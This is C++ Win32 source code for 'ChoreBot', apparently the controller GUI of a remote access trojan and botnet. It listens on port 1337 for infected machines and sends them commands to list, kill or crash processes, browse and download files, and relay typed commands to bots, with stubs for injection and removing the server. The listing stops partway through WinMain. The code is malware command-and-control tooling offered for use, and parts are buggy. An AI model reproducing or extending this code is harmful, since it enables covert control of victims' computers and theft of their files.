#define _WIN32_IE 0x0300

#include <windows.h>
#include <string.h>
#include <iostream.h>
#include <fstream.h>
#include <commctrl.h>
#include <stdio.h>
#include <winsock.h>
#include <shellapi.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <vector>
#include <string>


#define IDC_MAIN_STATUS	103
#define IDC_PRESS                       1000
#define IDC_OTHER                       1001
#define IDD_TOOLBAR                     101

#define TextOutA 
#define File 100
#define About 101
#define GetProcesses 1
#define GetFiles 2
#define Refrsh 3
#define ProcS 4
#define Kill 5
#define Download 6
#define FPath 7
#define FileBox 8
#define GetWindow 9
#define Close 10
#define Exec 11
#define Remv 12
#define ExecP 13
#define RemvP 14
#define OpenCD 15
#define CloseCD 16
#define RemoveS 17
#define SPserver 21
#define Cancel 53
#define Port 54
#define Listen  55
#define ConnectBtn 43333
#define Exit 2121
#define SetPort 3434
#define IsSetBotNet 3279
#define InputBox 7777
#define ReleaseSrvr 6933
#define Suspend     4545              
#define Crash       9454
#define Inject      3434
#define Protect     9754
#define LogOFF    4128
#define Reboot  9834
#define Shutdown 8533
#define Sleeps 34922
#define IPsConnected 484422
#define Donate 834253
#define Thanksto 47224
#define OK 83

HWND WindowProcs;
HWND WindowFiles;
HWND Refresh;
HWND ProcessesBox;
HWND Terminate;
HWND DownLoad;
HWND FilePath;
HWND FilesBox;
HWND GetWindowTitle;
HWND CloseW;
HWND Execute;
HWND Remove;
HWND ExecPath;
HWND RemovePath;
HWND CDopen;
HWND CDclose;
HWND RemoveServer;
HWND WindowTitle;
HWND StopServer;
HWND terminalWindow;
HWND hStatus;
HWND connectButton;
HWND g_hToolbar;
HWND static_WndTitle;
HWND ShowWnd;
HWND HideWnd;
HWND ShutdownBtn;
HWND LogoffBtn;
HWND SleepBtn;
HWND RebootBtn;
HWND MonOFFBtn;
HWND MonONBtn;
HWND hwndListOfIP;

HANDLE SOCK;
HANDLE Procs;
HANDLE FileS;
HANDLE RecvProc;
HANDLE RecvFiles;

WSADATA wsadata;
SOCKET client, server;

char szClassName[ ] = "ChoreBot";
char Text[17] = "Copyright: H0der";
char Command[200];
char Data[260];
char Ready[10];
char Buff[2000000];
int Cursel;
char DFile[50];
char* header[4096];    
char recvBUFF[4096];    
char* filename, * filesize;    
FILE * recvFILE;    
int received = 0;    
char tempstr[4096];    
int count1=1, count2=1, percent;
char LocalFP[MAX_PATH];
char RemoteFP[MAX_PATH];
char check[50];
char Ip[20];
int PORT;

HANDLE Recv;



void server_h(int s)
{
	if(server)
	   closesocket(server);
	if(client)
	   closesocket(client);
	WSACleanup();
	Sleep(1000);
	cout<<"LOLz SIGNAL :"<<s;
	exit(0);
}

DWORD WINAPI BOTNETThread(LPVOID lpParam)
{
    //SOCKET current_client = (SOCKET)lpParam;

    /*char buf[100];
    char sendData[100];
    char RecvdData[100] = "";*/
    int res;
	int ret;
    
	while(true)
	{
		strcpy(Command,"");
		cout<<"\nEnter command ->\n";
		fgets(Command,sizeof(Command),stdin);
		
		Sleep(5); 
		res = send(server,Command,sizeof(Command),0);	
		 
		 if(res==0)
		 {	
			printf("\nCLIENT terminated connection\n");
			Sleep(40);
			closesocket(client);
			client = 0;
			break;
		 }
		 else if(res==SOCKET_ERROR)
		 {	
			//-1 == send error
			printf("Socket error\n");
			Sleep(40);
			server_h(res);
			break;
		 }
	   
	   /*res = recv(server,RecvdData,sizeof(RecvdData),0);
	   if(res > 0)
	   { 
		cout<<endl<<RecvdData;
		strcpy(RecvdData,"");
	   }*/
	}
}

DWORD WINAPI BotNet(LPVOID)
{
      AllocConsole();
      HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
      SetConsoleTextAttribute(hStdout, FOREGROUND_GREEN|FOREGROUND_INTENSITY);
      SetConsoleTitle("Remote Control Of The The BOTNET");
      
      DWORD thread;
    
      printf("Starting up ...\r\n");
      
      if(WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
      {
      MessageBox(NULL, "Error by initialization !", "Initialization Failed", MB_OK | MB_ICONERROR);
      WSACleanup();
      exit(0);
      }
      
      client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      
      if(client == INVALID_SOCKET)
      {
      MessageBox(NULL, "Error by creating socket !", "Socket Error", MB_OK | MB_ICONERROR);
      WSACleanup();
      closesocket(client), (server);
      exit(0);
      }
      
      /*
 getpeername(client, (struct sockaddr*)&sockaddr_in, 0);
 printf("Peer IP address: %s\n", inet_ntoa(server.sin_addr));
 */
      
      struct sockaddr_in cln;
      
      cln.sin_port=htons(1337);
      cln.sin_addr.s_addr=INADDR_ANY;
      cln.sin_family=AF_INET;
      
      if(bind(client, (sockaddr*)&cln, sizeof(cln)) != 0)
      {
      MessageBox(NULL, "Error by bind socket !", "Bind Error", MB_OK | MB_ICONERROR);
      }
      
      int clnt = sizeof(cln);
      
      listen(client, 0);
      while(1)
      {      server = accept(client, (sockaddr*)&client, &clnt);
             if (client != WSAENETDOWN)
             {
                   printf("BOT connected\r\n");
             }

             CreateThread(NULL, 0,BOTNETThread,(LPVOID)client, 0, &thread);
       }
}






int parseARGS(char **args, char *line)
{
    int tmp=0;args[tmp] = strtok( line, ":" );
    while((args[++tmp] = strtok(NULL, ":" ) ) != NULL );
    return tmp - 1;
}


DWORD WINAPI RecvFile(LPVOID)
{    
    if(recv(server, recvBUFF, sizeof(recvBUFF), 0) )
    {            
    if(!strncmp(recvBUFF,"FBEGIN",6)) 
    {
    recvBUFF[strlen(recvBUFF) - 2] = 0;                
    parseARGS(header, recvBUFF);                
    filename = header[1];                
    filesize = header[2];            
    }        
    recvBUFF[0] = 0;            
    recvFILE = fopen (filename,"wb");
    percent = atoi( filesize ) / 100;  
    
    while(!feof(recvFILE))
    {                
    if(recv(server, recvBUFF, 1, 0) != 0 ) 
    {
    if(fwrite(recvBUFF , sizeof(recvBUFF[0]) , 1 , recvFILE) == ERROR)
    {
    MessageBox(NULL, "Error writing file !", "Error", MB_OK | MB_ICONERROR);
    TerminateThread(Recv, 0);
    }  
    
    if(count1 == count2) 
    {                        
    printf("33[0;0H"); //move cursor to 0, 0                        
    printf( "\33[2J"); //clear line                        
    printf("Filename: %s\n", filename);                        
    printf("Filesize: %d Kb\n", atoi(filesize) / 1024);                        
    printf("Percent : %d%% ( %d Kb)\n",count1 / percent ,count1 / 1024);                        
    count1+=percent;                    
    }                    
    count2++;                   
    received++;                    
    recvBUFF[0] = 0;            
    }
    }  
    } 
}

typedef BOOL(WINAPI* INETCHECKPROC) // internet.h -> CheckInternetConnection()
(
	LPDWORD lpdwFlags,
	DWORD dwReserved
);

static BOOL CheckInternetConnection()
{
	DWORD lpdwFlags;
    BOOL Connect;
    HINSTANCE hLib = NULL;
    INETCHECKPROC pfnInternetGetConnectedState;
    hLib = LoadLibrary("wininet.dll");
    if (!hLib){ return 0; } 
    pfnInternetGetConnectedState = (INETCHECKPROC)GetProcAddress(hLib, "InternetGetConnectedState");
    if(!pfnInternetGetConnectedState) return FALSE; 
    Connect = pfnInternetGetConnectedState(&lpdwFlags, 0) != 0;
    FreeLibrary(hLib); 
    return Connect; 
}

DWORD internet()
{
    while(1){
    if (CheckInternetConnection()){
    SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Internet Connection: Online");
    }
    else {
    SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Internet Connection: Offline");
    }
    }
}

BOOL EDbleWindow(BOOL b)
{
     EnableWindow(WindowProcs, b);
     EnableWindow(WindowFiles, b);
     EnableWindow(GetWindowTitle, b);
     EnableWindow(CloseW, b);
     EnableWindow(Execute, b);
     EnableWindow(Remove, b);
     EnableWindow(ExecPath, b);
     EnableWindow(RemovePath, b);
     EnableWindow(CDopen, b);
     EnableWindow(CDclose, b);
     EnableWindow(RemoveServer, b);
     EnableWindow(StopServer, b);
     EnableWindow(WindowTitle, b);
     EnableWindow(HideWnd, b);
     EnableWindow(ShowWnd, b);
     EnableWindow(ShutdownBtn, b);
     EnableWindow(RebootBtn, b);
     EnableWindow(SleepBtn, b);
     EnableWindow(LogoffBtn, b);
     EnableWindow(hwndListOfIP, b);
}

DWORD WINAPI WinSock(LPVOID)
{
      if(WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
      {
      MessageBox(NULL, "Error by initialization !", "Initialization Failed", MB_OK | MB_ICONERROR);
      WSACleanup();
      exit(0);
      }
      
      client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      
      if(client == INVALID_SOCKET)
      {
      MessageBox(NULL, "Error by creating socket !", "Socket Error", MB_OK | MB_ICONERROR);
      WSACleanup();
      closesocket(client), (server);
      exit(0);
      }
      
      struct sockaddr_in cln;
      
      cln.sin_port=htons(1337);
      cln.sin_addr.s_addr=INADDR_ANY;
      cln.sin_family=AF_INET;
      
      if(bind(client, (sockaddr*)&cln, sizeof(cln)) != 0)
      {
      MessageBox(NULL, "Error by bind socket !", "Bind Error", MB_OK | MB_ICONERROR);
      }
      
      int clnt = sizeof(cln);
      
      listen(client, 0);
      server = accept(client, (sockaddr*)&client, &clnt);
      EDbleWindow(true);
      MessageBox(NULL, "Connected !", "Connected", MB_OK | MB_ICONINFORMATION);
      TerminateThread(SOCK, 0);
}



DWORD WINAPI RecvProcesses(LPVOID)
{
      SendMessage(ProcessesBox, LB_RESETCONTENT, 0, 0);
      send(server, Ready, sizeof(Ready), 0);
      while(recv(server, Data, 200, 0))
      {
      if(!strcmp(Data, "finished"))
      {
      TerminateThread(RecvProc, 0);
      }

      else if(!strcmp(Data, "Successfully"))
      {
      }
      
      else if(!strcmp(Data, "Error"))
      {
      }
      
      else if(!strcmp(Data, ""))
      {
      }

      else
      SendMessage(ProcessesBox, LB_INSERTSTRING, (WPARAM)-1, (LPARAM)Data);
      send(server, Ready, sizeof(Ready), 0);
      }
}

DWORD WINAPI RecvFileS(LPVOID)
{
      SendMessage(FilesBox, LB_RESETCONTENT, 0, 0);
      
      while(recv(server, Data, sizeof(Data), 0))
      {
      if(!strcmp(Data, ""))
      {}
      
      if(!strcmp(Data, "Error"))
      {
      MessageBox(NULL, "Error getting file's !", "Error", MB_OK | MB_ICONERROR);
      strcpy(Data, "");
      TerminateThread(RecvFiles, 0);
      }
      
      if(!strcmp(Data, "finished"))
      {
      strcpy(Data, "");
      TerminateThread(RecvFiles, 0);
      }
      
      else
      {
      SendMessage(FilesBox, LB_INSERTSTRING, (WPARAM)-1, (LPARAM)Data);
      send(server, Ready, sizeof(Ready), 0);
      }
      }
}

LRESULT CALLBACK Processes (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_DESTROY:
    TerminateThread(RecvProc, 0);
    strcpy(Data, "");
    PostQuitMessage (0);
    break;
    
    case WM_CREATE:
    CreateWindowEx(0, "Button", "Refresh", WS_VISIBLE | WS_CHILD | WS_BORDER, 40, 260, 70, 20, hwnd, (HMENU)Refrsh, 0, NULL);
    CreateWindowEx(0, "Button", "Kill", WS_VISIBLE | WS_CHILD | WS_BORDER, 130, 260, 70, 20, hwnd, (HMENU)Kill, 0, NULL);
    CreateWindowEx(0, "Button", "Suspend", WS_VISIBLE | WS_CHILD | WS_BORDER, 130, 290, 70, 20, hwnd, (HMENU)Suspend, 0, NULL);
    CreateWindowEx(0, "Button", "Crash", WS_VISIBLE | WS_CHILD | WS_BORDER, 130, 320, 70, 20, hwnd, (HMENU)Crash, 0, NULL);
    CreateWindowEx(0, "Button", "Inject", WS_VISIBLE | WS_CHILD | WS_BORDER, 40, 290, 70, 20, hwnd, (HMENU)Inject, 0, NULL);
    CreateWindowEx(0, "Button", "Protect", WS_VISIBLE | WS_CHILD | WS_BORDER, 40, 320, 70, 20, hwnd, (HMENU)Protect, 0, NULL);
    ProcessesBox = CreateWindowEx(0, "ListBox", 0, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL | LBS_DISABLENOSCROLL, 20, 10, 200, 240, hwnd, (HMENU)ProcS, 0, NULL);
    break;
    
    case WM_COMMAND:
    switch(LOWORD(wParam))
    {
    case Refrsh:
    strcpy(Command, "GetProcesses");
    send(server, Command, 20, 0);
    TerminateThread(RecvProc, 0);
    RecvProc = CreateThread(NULL, 0, RecvProcesses, 0, 0, NULL);
    break;
    
    case Crash:
    if(MessageBox(NULL, "Are you sure, you want to Cause the Crash of the process ?", "Cause Crash of the Process", MB_YESNO | MB_ICONQUESTION) == IDYES)
    {                   
    strcpy(Command, "Crash");
    send(server, Command, sizeof(Command), 0);

    Cursel = SendMessage(ProcessesBox, LB_GETCURSEL, 0, 0);
    SendMessage(ProcessesBox, LB_GETTEXT, (WPARAM)Cursel, (LPARAM)Data);

    send(server, Data, sizeof(Data), 0);
    recv(server, Data, sizeof(Data), 0);
    
    if(!strcmp(Data, "Error"))
    {
    MessageBox(NULL, "Error by Crashing Process !", "Error", MB_OK | MB_ICONERROR);
    }
    
    else
    {
    SendMessage(ProcessesBox, LB_DELETESTRING, (WPARAM)Cursel, 0);
    MessageBox(NULL, "Process has probalby crashed!", "Process Crashed", MB_OK | MB_ICONINFORMATION);
    }
    }
    break;
    
    case Inject:
    strcpy(Command, "Inject");
    send(server, Command, 20, 0);
    MessageBox(NULL, "This feature will be available soon!", "Come Soon", 0);
    break;
    
    case Protect:
    strcpy(Command, "Protect");
    send(server, Command, 20, 0);
    MessageBox(NULL, "This feature will be available soon!", "Come Soon", 0);
    break;
    
    case Suspend:
    strcpy(Command, "Suspend");
    send(server, Command, 20, 0);
    MessageBox(NULL, "This feature will be available soon!", "Come Soon", 0);
    break;
    
    case Kill:
    if(MessageBox(NULL, "Are you sure, you want to terminate the process ?", "Terminate Process", MB_YESNO | MB_ICONQUESTION) == IDYES)
    {                   
    strcpy(Command, "Kill");
    send(server, Command, sizeof(Command), 0);

    Cursel = SendMessage(ProcessesBox, LB_GETCURSEL, 0, 0);
    SendMessage(ProcessesBox, LB_GETTEXT, (WPARAM)Cursel, (LPARAM)Data);

    send(server, Data, sizeof(Data), 0);
    recv(server, Data, sizeof(Data), 0);
    
    if(!strcmp(Data, "Error"))
    {
    MessageBox(NULL, "Error by killig process !", "Error", MB_OK | MB_ICONERROR);
    }
    
    else
    {
    SendMessage(ProcessesBox, LB_DELETESTRING, (WPARAM)Cursel, 0);
    MessageBox(NULL, "Process killed succesfully !", "Process Killed", MB_OK | MB_ICONINFORMATION);
    }
    }
    break;
    }
    
    default:
    return DefWindowProc (hwnd, message, wParam, lParam);
    }
}

DWORD WINAPI PWindow(LPVOID)
{
    HWND hwnd;
    MSG messages;
    WNDCLASSEX wincl;

    wincl.hInstance = 0;
    wincl.lpszClassName = "Processes";
    wincl.lpfnWndProc = Processes;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);

    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND+4;

    RegisterClassEx(&wincl);

    hwnd = CreateWindowEx (
           0,
           "Processes",
           "Processes",
           WS_SYSMENU | WS_VISIBLE,
           CW_USEDEFAULT,
           CW_USEDEFAULT,
           250,
           380,
           HWND_DESKTOP,
           NULL,
           0,
           NULL
           );

    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
}

LRESULT CALLBACK Files (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_DESTROY:
    TerminateThread(Recv, 0), TerminateThread(RecvFiles, 0);
    if(!strcmp(check, "DownloadAktiv"))
    {
    fclose(recvFILE);
    strcpy(check, "");
    }
    PostQuitMessage (0);
    break;
    
    case WM_CREATE: 
    CreateWindowEx(0, "Button", "Get Files", WS_VISIBLE | WS_CHILD | WS_BORDER, 8, 10, 80, 20, hwnd, (HMENU)GetFiles, 0, NULL);
    CreateWindowEx(0, "Button", "Download", WS_VISIBLE | WS_CHILD | WS_BORDER, 125, 10, 80, 20, hwnd, (HMENU)Download, 0, NULL);
    CreateWindowEx(0, "Edit", "C:\\WINDOWS\\*.txt", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 8, 35, 197, 18, hwnd, (HMENU)FPath, 0, NULL);
    FilesBox = CreateWindowEx(0, "ListBox", 0, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL | LBS_DISABLENOSCROLL, 8, 57, 198, 209, hwnd, (HMENU)FileBox, 0, NULL);
    break;
    
    case WM_COMMAND:
    switch(LOWORD(wParam))
    {
    case GetFiles:
    strcpy(Command, "GetFiles");
    send(server, Command, 20, 0);
    GetDlgItemText(hwnd, FPath, Data, sizeof(Data));
    send(server, Data, sizeof(Data), 0);
    TerminateThread(RecvFiles, 0);
    RecvFiles = CreateThread(NULL, 0, RecvFileS, 0, 0, NULL);
    break;

    case Download:
    strcpy(Command, "Download");
    send(server, Command, 20, 0);
    strcpy(check, "DownloadAktiv");
    Cursel = SendMessage(FilesBox, LB_GETCURSEL, 0, 0);
    SendMessage(FilesBox, LB_GETTEXT, (WPARAM)Cursel, (LPARAM)DFile);
    GetDlgItemText(hwnd, FPath, Data, sizeof(Data));
    
    if(!strcmp(Data, ""))
    {
    strcpy(Data, "Error");
    send(server, Data, 8, 0);
    MessageBox(NULL, "You doesn't typed the path of the file to download !", "Donwload", MB_OK | MB_ICONWARNING);
    TerminateThread(FileS, 0);
    }
    
    if(!strcmp(DFile, ""))
    {
    strcpy(Data, "Error");
    send(server, Data, 8, 0);
    MessageBox(NULL, "You doesn't selected a file to download !", "Download", MB_OK | MB_ICONWARNING);
    TerminateThread(FileS, 0);
    }
    
    send(server, Data, sizeof(Data), 0);
    Sleep(10);
    send(server, DFile, sizeof(DFile), 0);
    
    Recv = CreateThread(NULL, 0, RecvFile, 0, 0, NULL);
    break;
    }
    
    default:
    return DefWindowProc (hwnd, message, wParam, lParam);
    }
}

DWORD WINAPI FWindow(LPVOID)
{
    HWND hwnd;
    MSG messages;
    WNDCLASSEX wincl;

    wincl.hInstance = 0;
    wincl.lpszClassName = "Files";
    wincl.lpfnWndProc = Files;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);

    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND+4;

    RegisterClassEx(&wincl);

    hwnd = CreateWindowEx (
           0,
           "Files",
           "Files",
           WS_SYSMENU | WS_VISIBLE,
           CW_USEDEFAULT,
           CW_USEDEFAULT,
           220,
           292,
           HWND_DESKTOP,
           NULL,
           0,
           NULL
           );

    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
}


LRESULT CALLBACK AboutWin(HWND hwnd,UINT msg,WPARAM wparam,LPARAM lparam)
{
        HWND Check;
        HWND outputbox,inputbox;
        HDC hdc;
        HFONT font=CreateFont(-7,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,FF_DONTCARE,"System");
        HINSTANCE hinstance;


	switch(msg){
		case WM_CREATE:
			outputbox=CreateWindow("static","This is the public release of the GUI interface of ChoreBot\n There is no tutorial on how to use this software!",WS_VISIBLE|WS_CHILD,16,16,285,2000,hwnd,NULL,hinstance,NULL);
			inputbox=CreateWindow("edit","",WS_VISIBLE|ES_NUMBER|ES_CENTER|ES_MULTILINE | ES_AUTOVSCROLL,16,48,285,30,hwnd,(HMENU)InputBox, hinstance,NULL);
            CreateWindowEx(0, "Button", "&OK", WS_VISIBLE | WS_CHILD | WS_BORDER, 120, 350, 70, 40, hwnd, (HMENU)OK, 0, NULL);
            
            CreateWindow("static","lol!",WS_CHILD | WS_VISIBLE | BS_GROUPBOX,9 ,9,300,330,hwnd,NULL,hinstance,NULL);
            
			SendMessage(outputbox,WM_SETFONT,(WPARAM)font,MAKELPARAM(true,0));
			SendMessage(inputbox,WM_SETFONT,(WPARAM)font,MAKELPARAM(true,0));
			
            //SetWindowText(inputbox,"1337");
            //SendDlgItemMessage(hwnd, IsSetBotNet, BM_SETCHECK, BST_CHECKED, 0);
			
			EnableWindow(Check, 0);
			
			break;
	    case WM_DESTROY:
            strcpy(Data, "");
            PostQuitMessage (0);
            EnableWindow(connectButton, true);
            break;
        case WM_COMMAND:
            switch(LOWORD(wparam))
            {   
                 case OK:
                 PostQuitMessage (0);
                 break;
            }
			
		case WM_CTLCOLORSTATIC:
			SetTextColor((HDC)wparam,RGB(255,255, 255));
			SetBkMode((HDC)wparam,RGB(139, 26, 26));
			return (INT_PTR)GetStockObject(NULL_BRUSH);
			
		case WM_CTLCOLOREDIT:
			SetTextColor((HDC)wparam,RGB(100,248,20));
			SetBkColor((HDC)wparam,RGB(0,0,0));
			SetBkMode((HDC)wparam,OPAQUE);
			return (LRESULT)GetStockObject(BLACK_BRUSH);
            }
	return DefWindowProc(hwnd,msg,wparam,lparam);
}


DWORD WINAPI AboutWnd(LPVOID)
{   
	HWND hwnd;
	MSG messages;
	WNDCLASSEX wndclass;

	wndclass.hInstance = 0;
	wndclass.lpszClassName = "About ChoreBot";
	wndclass.lpfnWndProc = AboutWin;
	wndclass.style = CS_DBLCLKS;
	wndclass.cbSize = sizeof(WNDCLASSEX);
	
	wndclass.hIcon = LoadIcon(NULL,IDI_APPLICATION);
	wndclass.hIconSm = LoadIcon(NULL,IDI_APPLICATION);
	wndclass.hCursor = LoadCursor(NULL,IDC_ARROW);
	wndclass.lpszMenuName = NULL;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hbrBackground = CreateSolidBrush(RGB(56, 142, 142));
	
    RegisterClassEx(&wndclass);

	hwnd = CreateWindowEx(0,"About ChoreBot","About ChoreBot",WS_OVERLAPPEDWINDOW&~WS_THICKFRAME,CW_USEDEFAULT,CW_USEDEFAULT,325,430,HWND_DESKTOP,NULL,0,NULL);
	if(!hwnd){
		MessageBox(0,"ERROR: Failed to create window","ERROR",MB_OK|MB_ICONEXCLAMATION);
		return 2;}
		
	ShowWindow(hwnd,SW_SHOW);

	while(GetMessage(&messages,NULL,0,0)){
		TranslateMessage(&messages);
		DispatchMessage(&messages);}
	return messages.wParam;
}


LRESULT CALLBACK PortWin(HWND hwnd,UINT msg,WPARAM wparam,LPARAM lparam)
{
        HWND Check;
        HWND outputbox,inputbox;
        HDC hdc;
        HFONT font=CreateFont(-17,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,FF_DONTCARE,"Courier New");
        HINSTANCE hinstance;


	switch(msg){
		case WM_CREATE:
			outputbox=CreateWindow("static","Enter The Port To Listen On!",WS_VISIBLE|WS_CHILD,16,16,285,20,hwnd,NULL,hinstance,NULL);
			inputbox=CreateWindow("edit","",WS_VISIBLE|ES_NUMBER|ES_CENTER|WS_CHILD,16,48,285,30,hwnd,(HMENU)InputBox, hinstance,NULL);
            CreateWindowEx(0, "Button", "&Set Port", WS_VISIBLE | WS_CHILD | WS_BORDER, 40, 150, 90, 40, hwnd, (HMENU)SetPort, 0, NULL);
            CreateWindowEx(0, "Button", "&Cancel", WS_VISIBLE | WS_CHILD | WS_BORDER, 185, 150, 90, 40, hwnd, (HMENU)Cancel, 0, NULL);
            
            CreateWindow("static","lol!",WS_CHILD | WS_VISIBLE | BS_GROUPBOX,9 ,9,300,133,hwnd,NULL,hinstance,NULL);
            
            Check = CreateWindowEx(0,"button","Enable BotNet",WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,16,110,150,20,hwnd,(HMENU)IsSetBotNet,0,NULL);

			SendMessage(outputbox,WM_SETFONT,(WPARAM)font,MAKELPARAM(true,0));
			SendMessage(inputbox,WM_SETFONT,(WPARAM)font,MAKELPARAM(true,0));
			
			SetDlgItemText(hwnd, InputBox, "1337");
            //SetWindowText(inputbox,"1337");
            //SendDlgItemMessage(hwnd, IsSetBotNet, BM_SETCHECK, BST_CHECKED, 0);
			
			EnableWindow(Check, 1);
			
			break;
	    case WM_DESTROY:
            strcpy(Data, "");
            PostQuitMessage (0);
            EnableWindow(connectButton, true);
            break;
        case WM_COMMAND:
            switch(LOWORD(wparam))
            {
                 case SetPort:
            
			     if(1==1){
                          
						int len = GetWindowTextLength(GetDlgItem(hwnd, InputBox));
						if(6 > len > 0 )
						{
							int i;
							char* buf;

							buf = (char*)GlobalAlloc(GPTR, len + 1);
							GetDlgItemText(hwnd, InputBox, buf, len + 1);
							
							char Messg2[20] = "Listening on Port ";
							strcat(Messg2, buf);
							strcat(Messg2, " !!!");
							
							PORT = (int)buf;
							//MessageBox(0,(const char*)PORT ,"lol",0);
							MessageBox(0,Messg2 ,"Port",0);
							
							if ( SendDlgItemMessage(hwnd, IsSetBotNet, BM_GETCHECK, 0,0) == BST_CHECKED )
						    {
							     //GetDlgItemText(hwndDlg, IDC_EDIT1, chText, 200);
							     //SetDlgItemText(hwndDlg, IDC_KOPIE, chText);
							     CreateThread(NULL, 0, BotNet, 0, 0, NULL);
					        }
							else
							{
                                 SOCK = CreateThread(NULL, 0, WinSock, 0, 0, NULL);
                            }
							
							EnableWindow(connectButton, false);

						}
						else
						{
							MessageBox(hwnd, "Wrong Input!", "Warning", MB_OK);
							return 1;
						}
					}
					else 
					{
						MessageBox(hwnd, "Couldn't translate that number :(", "Warning", MB_OK);
					}
					
                 PostQuitMessage (0);
                 break;
    
                 case Cancel:
                 strcpy(Data, "");
                 PostQuitMessage (0);
                 EnableWindow(connectButton, true);
                 break;
            }
			
		case WM_CTLCOLORSTATIC:
			SetTextColor((HDC)wparam,RGB(139, 26, 26));
			SetBkMode((HDC)wparam,RGB(139, 26, 26));
			return (INT_PTR)GetStockObject(NULL_BRUSH);
			
		case WM_CTLCOLOREDIT:
			SetTextColor((HDC)wparam,RGB(100,248,20));
			SetBkColor((HDC)wparam,RGB(0,0,0));
			SetBkMode((HDC)wparam,OPAQUE);
			return (LRESULT)GetStockObject(BLACK_BRUSH);
            }
	return DefWindowProc(hwnd,msg,wparam,lparam);
}


DWORD WINAPI PortWnd(LPVOID)
{   
	HWND hwnd;
	MSG messages;
	WNDCLASSEX wndclass;

	wndclass.hInstance = 0;
	wndclass.lpszClassName = "Port";
	wndclass.lpfnWndProc = PortWin;
	wndclass.style = CS_DBLCLKS;
	wndclass.cbSize = sizeof(WNDCLASSEX);
	
	wndclass.hIcon = LoadIcon(NULL,IDI_APPLICATION);
	wndclass.hIconSm = LoadIcon(NULL,IDI_APPLICATION);
	wndclass.hCursor = LoadCursor(NULL,IDC_ARROW);
	wndclass.lpszMenuName = NULL;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hbrBackground = CreateSolidBrush(RGB(56, 142, 142));
	
    RegisterClassEx(&wndclass);

	hwnd = CreateWindowEx(0,"Port","Set Port",WS_OVERLAPPEDWINDOW&~WS_THICKFRAME,CW_USEDEFAULT,CW_USEDEFAULT,325,230,HWND_DESKTOP,NULL,0,NULL);
	if(!hwnd){
		MessageBox(0,"ERROR: Failed to create window","ERROR",MB_OK|MB_ICONEXCLAMATION);
		return 2;}
		
	ShowWindow(hwnd,SW_SHOW);

	while(GetMessage(&messages,NULL,0,0)){
		TranslateMessage(&messages);
		DispatchMessage(&messages);}
	return messages.wParam;
}


void FillListBox(HWND hwndListOfIP)
{
TCHAR *pVarName[] = {"Item1", "Item2", "Item3", "Item4", "Item5"};
 
for(int i=0; i<5; i++)
{
        SendMessage(hwndListOfIP, CB_ADDSTRING, 0, (LPARAM)pVarName[i]);
 
}
}

LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{    
    INITCOMMONCONTROLSEX dICC;
	dICC.dwSize = sizeof(INITCOMMONCONTROLSEX);
	dICC.dwICC = ICC_TREEVIEW_CLASSES | ICC_BAR_CLASSES;

	BOOL bInitCommonControlLib = InitCommonControlsEx(&dICC);
	if(!bInitCommonControlLib)
	{
		MessageBox(NULL, TEXT("Unable to load Common Controls!"), "Damn", MB_ICONERROR);
	}
	
	
    HWND hwnd;
    MSG messages;
    WNDCLASSEX wincl;

    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;
    wincl.style = CS_DBLCLKS;
    wincl.cbSize = sizeof (WNDCLASSEX);

    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;
    wincl.cbClsExtra = 0;
    wincl.cbWndExtra = 0;
    wincl.hbrBackground = CreateSolidBrush(RGB(154, 255, 154));//(HBRUSH) GetStockObject(GRAY_BRUSH);//(HBRUSH) COLOR_BACKGROUND+4;

    if (!RegisterClassEx (&wincl))
        return 0;
        
    int SCR_WIDTH =      GetSystemMetrics(SM_CXSCREEN) - 1; 
    int SCR_HEIGHT =   GetSystemMetrics(SM_CYSCREEN) - 1;
